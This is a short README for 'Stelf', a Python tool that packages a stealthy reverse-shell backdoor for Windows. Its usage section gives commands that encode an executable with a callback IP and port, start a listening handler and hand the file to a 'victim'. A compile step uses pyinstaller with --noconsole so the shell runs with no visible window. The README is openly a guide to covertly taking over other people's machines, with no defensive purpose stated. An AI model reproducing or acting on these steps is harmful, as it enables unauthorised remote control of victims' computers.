# Stelf
### Shell That Excercises Limited Fanfare

## Demo

[![asciicast](https://asciinema.org/a/agt46e0dpxo7ecrucvos6c5am.png)](https://asciinema.org/a/agt46e0dpxo7ecrucvos6c5am)

## Usage


##### Encode your executable:
```
python2 encode.py 192.168.1.5 8080 backdoor.exe
```
##### Start handler
```
python2 handler.py
```

##### Give executable to victim 

Rejoice

## Compiling the executable yourself - optional

#### Steps to Install:

- Install [Python2.7](https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi)
- Install [Microsoft Visual C++ 9.0](https://download.microsoft.com/download/7/9/6/796EF2E4-801B-4FC4-AB28-B59FBF6D907B/VCForPython27.msi)
- pip install -r requirements.txt

##### Compile the shell manually:

```
pyinstaller --noconsole --onefile shell.py
```

Your file will be in dist/shell.exe

Enjoy!
